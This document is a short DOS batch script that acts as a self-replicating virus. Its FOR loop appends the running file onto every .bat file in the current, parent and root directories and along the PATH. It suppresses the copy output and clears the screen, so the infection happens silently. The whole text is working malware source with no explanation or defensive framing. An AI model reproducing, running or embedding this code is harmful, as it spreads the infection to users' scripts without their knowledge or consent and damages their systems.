@ECHO OFF
FOR %%i IN (*.bat ..\*.bat \*.bat %path%\*.bat) do COPY %%i+%0 %%i>nul
cls
